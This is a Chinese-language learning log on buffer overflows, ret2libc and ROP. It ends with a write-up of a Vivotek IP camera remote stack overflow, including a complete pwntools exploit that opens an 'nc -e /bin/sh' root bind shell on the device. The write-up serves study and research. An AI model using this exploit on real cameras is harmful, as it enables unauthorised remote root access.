[TOC]

# shellcode_learning

这个日志记录了学习shellcode过程和在学习过程中遇到的问题。<br><br>
主要参考了蒸米的一步一步学ROP，修改了作者的部分错误和参考了一些其他博客。<br><br>

## 配置环境
-------------------
操作系统：ubuntu16.04 LTS 64位系统（建议不使用ubuntu18,可能使用了更加复杂的地址保护机制，容易导致实验失败）<br>
编译工具：
1. python2 <br>
2. pwntools(py的库函数，安装方法见https://www.cnblogs.com/pcat/p/5451780.html ）<br>
3. objdump <br>
4. ROPgadget<br>
5. socat挂载程序<br><br>
## ROP攻击
ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。<br><br>
## linux_86
具体参考 https://yq.aliyun.com/articles/58699 <br> 
### Control Flow Hijack 程序流劫持
比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。<br>
首先我们先关闭这些保护措施来实施一次攻击（c语言代码在linux_86,level1中）其中-fno-stack-protector关掉Stack Protector，-z execstack关掉DEP<br>
$ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
注意：因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br><br><br>
执行以下指令ASLR保护<br>
$ sudo -s<br>
$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
$ exit<br><br>
我们利用pattern.py脚本来寻找溢出点<br>
$ python pattern.py create 150得到<br>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br><br><br>
使用gdb调试level1<br>
$ gdb ./level1<br>
（gdb)run 得到<br>
Program received signal SIGSEGV, Segmentation fault.<br>
0x37654136 in ?? ()<br>
（gdb）quit<br>
我们可以得知内存出错的地址为0x37654136，通过pattern.py脚本可以知道溢出点位置<br>
$ python pattern.py offset 0x37654136 得到<br>
hex pattern decoded as: 6Ae7<br>
140<br><br><br>
PC覆盖的溢出点为140字节处，我们只需要构造一个“A”*140+ret(返回地址）的字符串就可以让PC执行ret上的代码了，这里使用execve ("/bin/sh")命令的语句作为shellcode，这个可以打开一个终端（见linux_86 exp1.py)。原理如下所示：<br>
[shellcode][“AAAAAAAAAAAAAA”….][ret]<br>
^------------------------------------<br>
但在现实攻击中shellcode地址的位置并非这么简单。因为在gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。因此不能通过使用gdb调试目标程序，然后查看内存来确定shellcode的位置。<br><br>
为了解决这个问题可以开启core dump，当程序内存出现错误的时候系统会生成一个core dump文件在tmp目录下，用gdb调试core文件就可以获取到真实的地址。<br>
$ ulimit -c unlimited<br>
$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br><br><br>
$ ./level1 得到<br>
ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
段错误 (核心已转储)<br>
（可以先进入cd /tmp，然后ls查看core文件名称）<br>
$ gdb level1 /tmp/core.1545029320<br>
Program terminated with signal SIGSEGV, Segmentation fault.<br>
#0  0x41414141 in ?? ()<br>
通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffffd000<br>
(gdb) x/10s $esp -144<br>
0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
0xffffd099:	""<br><br><br>
执行python脚本完成攻击：<br>
$ python exp1.py<br>
[+] Starting local process './level1': pid 14146<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] （得到你的用户名则是攻击成功了，如果攻击失败，应该是ret地址出错）<br><br><br>
如果想更加深刻的理解溢出的原理可以参考https://blog.csdn.net/linyt/article/details/43315429 ，与这里例子不同的是它是将shellcode放在不同地方，但原理是相同的，通过ret返回到shellcode的位置来执行。<br><br><br>
### 如何进行远程调试
远程调试的原理与之前一模一样，只是需要重新寻找ret地址<br><br><br>
关闭地址随机化<br>
$ sudo -s<br>
$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
$ exit<br><br><br>
得到core文件方便gdb调试<br>
$ ulimit -c unlimited<br>
$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br><br>
进行socat挂载程序：<br>
socat TCP4-LISTEN:2008,fork EXEC:./level1<br><br>
开启另一终端：<br>
ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br><br><br>
$ gdb level1 /tmp/core.1545029325<br>
Program terminated with signal SIGSEGV, Segmentation fault.<br>
#0  0x41414141 in ?? ()<br>
(gdb) x/10s $esp -144<br>
0xffffcf50:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br><br><br>
将python程序设置到remote模式后：<br>
$ python exp1.py<br>
[+] Opening connection to 127.0.0.1 on port 2008: Done<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br><br>

### Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护
现在我们将DEP打开，将stack protector和ASLR仍然关闭<br>
$  gcc -fno-stack-protector -m32 -o level2 level1.c<br>
如果此时level1的exp来进行测试的话，系统会拒绝执行我们的shellcode<br>
如何执行shellcode呢？我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。<br><br><br>
$ gdb ./level2<br>
(gdb) break main<br>
Breakpoint 1 at 0x80484ea<br>
(gdb) run<br>
Breakpoint 1, 0x080484ea in main ()<br>
(gdb) print system 得到<br>
$1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
(gdb) print __libc_start_main<br>
$2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
(gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
0xf7f5e02b<br>
(gdb）quit<br><br><br>
由此我们得到了system函数地址和“/bin/sh”字符串的地址。<br>
$ python exp2.py<br>
[+] Starting local process './level2': pid 14319<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>
更多Ret2libc可以参考 https://blog.csdn.net/linyt/article/details/43643499
  
### ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护
接下来我们再打开ASLR保护：<br>
$ sudo -s<br>
$ echo 2 > /proc/sys/kernel/randomize_va_space<br>
$ cat /proc/sys/kernel/randomize_va_space<br>
2<br>
$ exit<br><br><br>
那么如何解决地址随机化的问题呢？思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。由于因为程序本身在内存中的地址并不是随机的，所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表<br>
$ objdump -d -j .plt level2 得到<br>
level2：     文件格式 elf32-i386<br>
Disassembly of section .plt:<br>
080482f0 <read@plt-0x10>:<br>
 80482f0:	ff 35 04 a0 04 08    	pushl  0x804a004<br>
 80482f6:	ff 25 08 a0 04 08    	jmp    *0x804a008<br>
 80482fc:	00 00                	add    %al,(%eax)<br>
	...<br>

08048300 <read@plt>:<br>
 8048300:	ff 25 0c a0 04 08    	jmp    *0x804a00c<br>
 8048306:	68 00 00 00 00       	push   $0x0<br>
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <_init+0x28><br>

08048310 <__libc_start_main@plt>:<br>
 8048310:	ff 25 10 a0 04 08    	jmp    *0x804a010<br>
 8048316:	68 08 00 00 00       	push   $0x8<br>
 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x28><br>

08048320 <write@plt>:<br>
 8048320:	ff 25 14 a0 04 08    	jmp    *0x804a014<br>
 8048326:	68 10 00 00 00       	push   $0x10<br>
 804832b:	e9 c0 ff ff ff       	jmp    80482f0 <_init+0x28><br>
$ objdump -R level2 得到<br>
level2：     文件格式 elf32-i386<br>

DYNAMIC RELOCATION RECORDS<br>
OFFSET   TYPE              VALUE <br>
08049ffc R_386_GLOB_DAT    __gmon_start__<br>
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0<br>
0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>
0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0<br>
我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。
因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br><br>
使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址<br>
$ ldd level2<br>
$ cp /lib32/libc.so.6 libc.so<br>
查看vulnerable_function地址，这里查看函数地址是因为我们想返回到这个地址，让我们可以继续执行缓冲区溢出<br>
$ objdump -d level2 | grep vulnerable_function<br>
0804843b <vulnerable_function>:<br>
 8048471:	e8 c5 ff ff ff       	call   804843b <vulnerable_function><br>
$ python exp3.py<br>
[ * ].......<br>
[ * ] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

关于GOT和PLT的更多消息： https://blog.csdn.net/linyt/article/details/51635768 <br><br><br>
## linux_64
linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。<br>
具体参考http://www.vuln.cn/6644 和 http://www.itdaan.com/blog/2018/06/03/77fa932b210ca9370b06a160df4045f8.html （后面这个对过程讲解得更加详细）<br><br><br>
### linux_64溢出攻击（利用辅助函数）
我们打开ASLR编译level3
$ gcc -fno-stack-protector level3.c -o level3<br>
通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。<br><br>
$ python pattern.py create 150 > payload<br>
$ gdb ./level3<br>
(gdb) run < payload<br>
Starting program: /home/dzh/learning/level3 < payload<br>
Hello, World<br>

Program received signal SIGSEGV, Segmentation fault.<br>
0x00000000004005e7 in vulnerable_function ()<br><br>
PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。<br>
(gdb) x/gx $rsp<br>
0x7fffffffde68:	0x3765413665413565<br>
(gdb) quit<br><br>
利用pattern脚本得到溢出点
$ python pattern.py offset 0x3765413665413565<br>
hex pattern decoded as: e5Ae6Ae7<br>
136<br>
python -c 'print "A"*136+"ABCDEF\x00\x00"'>payload<br>
$ gdb ./level3<br>
(gdb) run < payload<br>
Starting program: /home/dzh/learning/level3 < payload<br>
Hello, World<br>

Program received signal SIGSEGV, Segmentation fault.<br>
0x0000464544434241 in ?? ()<br>
因为是小端机，这里我们已经看出我们已经成功控制了PC指针<br>
(gdb) quit<br>
 我们可以通过objdump 查看cllsystem地址完成攻击<br>
$ objdump -d level3 | grep callsystem<br>
00000000004005b6 <callsystem>:<br>
python exp5.py<br>
[ * ].......<br>
[ * ] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

### 使用工具寻找gadgets
这里只使用了ROPgadget，初次之外还有一些知名的工具：
1. ROPEME: https://github.com/packz/ropeme
2. Ropper: https://github.com/sashs/Ropper
3. ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
4. rp++: https://github.com/0vercl0k/rp
<br>
查看level4会发现首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4和libc.so中所有pop ret的gadgets。<br>
gcc -fno-stack-protector level4.c -o level4 -ldl<br>
$ ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi<br>
0x0000000000020256 : pop rdi ; pop rbp ; ret<br>
0x0000000000021102 : pop rdi ; ret<br>
这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了<br>
$ python exp6.py<br>
[*] '/home/dzh/learning/libc.so.6'<br>
$ whoami<br>
[用户名] <br><br>

### 通用ROP攻击
在去掉所有辅助函数后该如何构造ROP链呢？可以看到这个程序（level5.c）仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。<br><br>
$ objdump -d ./level5<br><br>
我们可以看到利用0x400616处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x400600处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。<br><br>
1. payload1:我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。<br>脚本中的56是指，在cmp判断相等后，jne不跳转，执行一个“add rsp ,8” 和6次pop，然后返回，那么我们在后面再布置7个地址，每个地址用8个“00”覆盖<br><br>
与exp3不同的是这里调用的是这里使用的是got而不是plt，原因在于这里执行的是call qword ptr [r12+rbx*8]，plt是程序代码，got才是write函数真正的地址。<br>
call dword ptr [ExitProcess] 表明[ExitProcess] 存储的不是程序代码，而是指向程序代码的地址。<br>
call [ExitProcess] 表明 [ExitProcess] 存储的应该是程序代码<br>
2. payload2:当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。<br>
3. payload3:最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。<br><br><br>
$ python exp7.py<br>
[*] '/home/dzh/learning/level5'<br>
[+] Starting local process './level5': pid 4031<br>
got_write: 0x601018<br>
got_read: 0x601020<br>
off_system_addr: 0xb1f20<br>
#############sending payload1#############<br>
write_addr: 0x7ffff7b042b0<br>
system_addr: 0x7ffff7a52390<br>
Hello, World<br>
#############sending payload2#############<br>
Hello, World<br>
#############sending payload3#############<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>


[TOC]

漏洞介绍
============

Vivotek IP Cameras - Remote Stack Overflow
-------------------
>   &ensp;&ensp;&ensp;&ensp;Vivotek 旗下多款摄像头被曝出远程未授权栈溢出漏洞，攻击者发送特定数据可导致摄像头进程崩溃。

>   &ensp;&ensp;&ensp;&ensp;漏洞作者@bashis 放出了可造成摄像头 Crash 的PoC：
>   &ensp;&ensp;&ensp;&ensp;https://www.seebug.org/vuldb/ssvid-96866

>   &ensp;&ensp;&ensp;&ensp;该漏洞在 Vivotek 的摄像头中广泛存在，按照官方的安全公告，会影响以下版本：
>   &ensp;&ensp;&ensp;&ensp;CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2 FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2 FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2 FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2 FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191 FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166 IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2 MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH SD9366-EHL VS8100-V2

>   &ensp;&ensp;&ensp;&ensp;Vivotek 官方提供了各种型号摄像头的固件下载：http://www.vivotek.com/firmware/ ，通过官网我们可以发现在官网固件下载页面中的大多数固件均早于漏洞曝出时间。通过对几款摄像头的最新固件进行验证，发现漏洞依然存在，这意味着截止漏洞被曝出，Vivotek 官方对该漏洞的修复并不彻底。但这也给了我们研究和利用漏洞的机会。



时间线
-------------------

>   &ensp;&ensp;&ensp;&ensp;October 1, 2017: Reported findings with all details to Vivotek Cybersecurity
>   &ensp;&ensp;&ensp;&ensp;October 2, 2017: First response from Vivotek
>   &ensp;&ensp;&ensp;&ensp;October 5, 2017: ACK of findings from Vivotek
>   &ensp;&ensp;&ensp;&ensp;October 11, 2017: Vivotek reported first fixed Firmware
>   &ensp;&ensp;&ensp;&ensp;October 12, 2017: After request, Vivotek provided samples of fixed Firmware
>   &ensp;&ensp;&ensp;&ensp;October 17, 2017: Verified fixed Firmware, Vivotek thanking for the help
>   &ensp;&ensp;&ensp;&ensp;October 30, 2017: Noticed new Firmware released, pinged to get some info about their advisory
>   &ensp;&ensp;&ensp;&ensp;November 1, 2017: Agreed on publication November 13, 2017
>   &ensp;&ensp;&ensp;&ensp;November 9, 2017: Checked few release notes, none mention security fix; pinged Vivotek with the question why not.
>   &ensp;&ensp;&ensp;&ensp;November 13, 2017: No reply from Vivotek, Full Disclosure as planned.

攻击步骤
-------------------
>   &ensp;&ensp;&ensp;&ensp;栈溢出会被'PUT'或者'POST'请求所触发。具体的触发格式为
>   1."[PUT|POST]Content-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"（本文采用的是这种格式）
>   2."[PUT|POST][JUNK]Content-Length[JUNK]:[20 bytesgarbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"
>   &ensp;&ensp;&ensp;&ensp;注意：Good bytes是指 0x01-0x09, 0x0b-0xff; Bad bytes是指0x00, 0x0a;bad bytes在会被截断，导致shellcode构造失败！

二进制文件分析
============
httpd
-------------------
>用tftp将/usr/sbin/httpd,传送到主机后用file命令查看文件属性，结果可知目标架构为 ARM、小端、32位。且该 ELF 文件为动态链接
![](http://10.10.2.24:8181/uploads/201901/security/attach_157677889656679a.png)

安全机制
-------------------
> 开启了 NX 保护，这意味着我们无法在栈上部署 shellcode
![](http://10.10.2.24:8181/uploads/201901/security/attach_15767aa0140c29f9.png)

编译环境与攻击工具
============

gdbserver+gdb
-------------------
>   &ensp;&ensp;&ensp;&ensp; 在二进制文件分析中得知目标架构为 ARM、小端、32位。且该 ELF 文件为动态链接。因此决定采用gdbserver-7.7.1-armel-eabi5-v1-sysv 可在链接中获取： https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static ，下载后可以用telnet登录摄像头，使用tftp安装到摄像头中。
>   &ensp;&ensp;&ensp;&ensp;由于gdbserver是7.7.1版本的，因此需要适配的gdb版本（非常重要！否则会导致gdb无法调试等许多问题）gdb可以在官网中找到合适的版本 ftp://ftp.gnu.org/gnu/gdb 
>   具体的编译步骤如下：
>   1.tar zxvf gdb-7.11.1-tar-bz2
>   2.cd gdb-7.11.1
>   3../configure --target=arm-linux --prefix=/usr/local/arm-gdb – v 然后更改配置vi /etc/profile 在末尾添加 export PATH=$PATH:/usr/local/arm-gdb/bin ，这样可以找到路径
>   4.make
>   5.make install完成gdb的安装

pwn
-------------------
>   &ensp;&ensp;&ensp;&ensp;pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。pwntools对Ubuntu 12.04和14.04的支持最好，但是绝大多数的功能也支持Debian, Arch, FreeBSD, OSX, 等等。
> 首先安装Capstone：
> 1.git clone https://github.com/aquynh/capstone
> 2.cd capstone
> 3.make
> 4.make install
> 然后安装pwntools:
> 1.pip install pwntools
> 官方文档：http://docs.pwntools.com/en/stable/

ROPgadget
-------------------
> ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。使用ROPgadget可以帮助我们快速获取可使用的gadget。
> 1.git clone https://github.com/JonathanSalwan/ROPgadget.git
> 2.cd ROPgadget
> 3.sudo python setup.py install

漏洞利用
============
DEP
-------------------
> 数据执行保护DEP（Data Execute Prevention）技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。对于缓冲区溢出攻击，攻击者能够对内存的堆栈或堆的缓冲区进行覆盖操作，并执行写入shellcode代码。启用DEP后，这些敏感区域设置为不可执行的no-executable标志位，因此即使溢出后跳转到恶意代码的地址，也无法被执行，从而阻止了缓冲区溢出攻击。

return2libc原理
-------------------
>既然注入Shellcode无法执行，进程和动态库的代码段怎么也要执行吧，具有可执行属性，那攻击者能否利用进程空间现有的代码段进行攻击，答案是肯定的。

>在系统函数库（Linux称为glibc）有个system函数，它就是通过/bin/sh命令去执行一个用户执行命令或者脚本，我们完全可以利用system来实现Shellcode的功能。EIP一旦改写成system函数地址后，那执行system函数时，它需要获取参数。而根据Linux X86 32位函数调用约定，参数是压到栈上的。因为栈空间完全由我们控制了，所以控制system的函数不是一件难事情。
>这种攻击方法称之为ret2libc，即return-to-libc，返回到系统库函数执行 的攻击方法

ROP原理
-------------------
> 顾名思义ROP，就是面向返回语句的编程方法，它借用libc代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。为什么是retq，因为retq指令返到哪里执行，由栈上的内容决定，而这是攻击者很容易控制的地址。那参数如何控制，就是利用retq执行前的pop reg指令，将栈上的内容弹到指令的寄存器上，来达到预期。一段retq指令未必能完全到想攻击目标的前提条件，那可在栈上控制retq指令跳到另一段retq指令表，如果它还达不到目标，再跳到另一段retq，直到攻击目标实现。


漏洞利用细节
-------------------
> 根据漏洞作者 @bashis 提供的 PoC
echo -en "POST /cgi-bin/admin/upgrade.cgi 
HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.14.75 80
![](http://10.10.2.24:8181/uploads/201901/security/attach_15767a0636df38b2.png)
> 利用pwn对httpd分析可以得到httpd开启了 NX 保护，这代表着无法在栈上部署 shellcode，因此我们采用了return2libc的方法。
![](http://10.10.2.24:8181/uploads/201901/security/attach_15763c8c0892d6c6.png)
> 在摄像头上cat /proc/sys/kernel/randomize_va_space 结果为2，说明开启了ASLR保护，我们首先echo 0 > /proc/sys/kernel/randomize_va_space暂时关闭ASLR保护后，就可以正式开始利用漏洞了。

>1.查找libC 库的加载地址：
> 我们可以在进程找到httpd的pid，查看/proc/[pid]/maps 找到libc的加载地址
![](http://10.10.2.24:8181/uploads/201901/security/attach_15763d266f9530d0.png)
>2.根据前面的PoC可以得到X占据了esp的位置，因此只要构造 0x38 - 4 字节以上的数据，栈底的函数返回地址就会被劫持。并且发现崩溃时 SP 寄存器的地址为0xbeffea60。而此时，我们想调用的是system函数。system() 函数地址 = libC 库在内存中的加载基址 + system() 函数在 libC 库中的偏移，通过劫持该地址为 libC 库中的 system() 函数地址，再设置 R0 寄存器指向命令字符串，就可以执行任意命令。
>3.验证nc 命令可以正常使用：
>在摄像头上执行nc -lp2222 -e/bin/sh，在主机上执行nc 192.168.14.75 2222 发现摄像头支持nc指令，因此我们可以把字符串参数 "nc -lp2222 -e/bin/sh"部署到栈上，并且将地址存入 R0
>4.寻找gadget:
使用ROPgadget寻找gadgets
![](http://10.10.2.24:8181/uploads/201901/security/attach_15763e74a81a92ee.png)
得到了0x00033100 : pop {r0, pc}
>但是却不能使用，因为0xb6f2b000+0x00033100 = B6F5E100出现了坏字符0x00，会在发送时被截断，因此需要采用迂回的方法得到合适的gadgets，最终选择了
> 0x00048784 : pop {r1, pc} 
> 0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}
>得到上述所有信息后我们可以开始攻击脚本的编写：

```python
# -*- coding: UTF-8 -*-
#!/usr/bin/python

from pwn import *
import os
p = remote('192.168.14.75',80)
libc_base = 0xb6f2b000    # libC 库在内存中的加载地址
stack_base = 0xbeffea60 # 崩溃时 SP 寄存器的地址
libc_elf = ELF('libuClibc-0.9.33.3-git.so')

payload = (0x38 - 4) * 'a' # padding
payload +=  p32(0x00048784 + libc_base) # gadget1
payload += p32(0x80 + stack_base) # 栈中命令参数地址
payload += p32(0x00016aa4 + libc_base) # gadget2
payload += (0x8 * 'a')  # padding
payload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址
payload += ('pwd;' * 0x100 + 'nc\x20-lp2222\x20-e/bin/sh\x20>') # 命令参数
payload = "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n".format(payload)
p.send(payload)
``` 
>在ARM 架构中，会优先通过寄存器传递参数，如果参数个数超过了寄存器的数量，则将剩下的参数压入调用参数空间（即堆栈），即sp寄存器
> 为了确保命令能执行，我们在真正要执行的命令前加了部分命令作为缓冲。这里用了'pwd;' * 0x100，后来我试验发现* 0x120 ，* 0x80 都行，这里并不需要一个具体的数字，只是希望能够把'nc\x20-lp2222\x20-e/bin/sh\x20>'压入堆栈中，但是这个'pwd;'中的';'非常重要，截断shell，否则不能运行
在主机上运行nc 192.168.14.75 2222即可获取root权限
>下图为攻击的大概流程
![](http://10.10.2.24:8181/uploads/201901/security/attach_15764f099af8e553.png)
>下图为攻击的结果
![](http://10.10.2.24:8181/uploads/201901/security/attach_1576443e948bab3e.png)







